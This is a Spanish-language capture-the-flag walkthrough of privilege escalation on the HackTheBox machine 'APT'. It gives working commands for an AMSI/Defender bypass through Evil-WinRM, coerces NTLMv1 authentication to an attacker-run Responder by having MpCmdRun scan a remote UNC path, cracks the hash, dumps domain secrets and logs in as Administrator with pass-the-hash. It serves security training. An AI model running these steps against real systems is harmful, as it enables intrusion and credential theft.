## Privilege Escalation {-}

### Rootear la maquina {-}

Aqui vamos a tirar de **WinPeas**. Descargamos el winPEAS en nuestro equipo de atacante

```bash
wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
```

Il lo cargamos desde Evil-WinRM

```powershell
cd C:\Users\henry.vinson_adm\AppData\Local\Temp
upload winPEASx64.exe
dir
.\winPEASx64.exe
```

Aqui vemos que no podemos lanzar el exe porque no lo pilla el antivirus. En este caso el defender no nos deja passar por los bypass normales
pero podemos hacer cositas con funcciones de Evil-WinRM.

```powershell
menu
Bypass-4MSI
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/winPEASx64.exe
```

Tenemos que esperar que se acabe la ejecucion para ver el resultado.

Aqui no vemos nada interessante. Probamos otre binario de analysis, el [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/).

```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
```

Lo cargamos nuevamente a la maquina victima

```powershell
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe -group=all
```

Aqui podemos ver que el NTLM de version 1 esta expuesta en esta maquina.

Aqui vamos a tirar de [crack.sh](https://crack.sh/cracking-ntlmv1-w-ess-ssp/) en lo cual podemos tratar de utilizar el **responder** para
recuperar la llaves y crackearlas con [crack.sh](https://crack.sh)

1. Modificamos el fichero de configuracion de responder

    ```bash
    cd /usr/share/responder
    vi Responder.conf

    # cambiamos el challenge 
    Challenge = 1122334455667788
    ```

1. lanzamos el responder

    ```bash
    python3 responder.py -I tun0 --lm
    ```

1. desde la maquina victima aprovechamos del defender para scanear ficheros

    ```bash
    cd C:\Program Files\Windows Defender
    .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.8\algoquenoexiste
    ```

Aqui vemos que hemos pillado el hash NTLMv1 de la propria maquina. Lo copiamos y usamos de ntlmv1-multi para crear el hash necessario para
romper con crack.sh

```bash
git clone https://github.com/evilmog/ntlmv1-multi
cd ntlmv1-multi
python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C72487742B427E1AE5B8D5CE6830A49B5BBB58D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
```

Aqui podemos copiar el hash en [crack.sh](https://crack.sh) usando un temporary email y recivimos un mail con la key.

```bash
impacket-secretsdump -hashes :d167c32388864b12f5f82feae86a7f798 'htb.local/APT$@apt'
```

Aqui ya vemos los hash de los usuarios y con evil-winRM no connectamos con el usuario administrator

```bash
evil-winrm -i apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
```

y visualizar la flag.
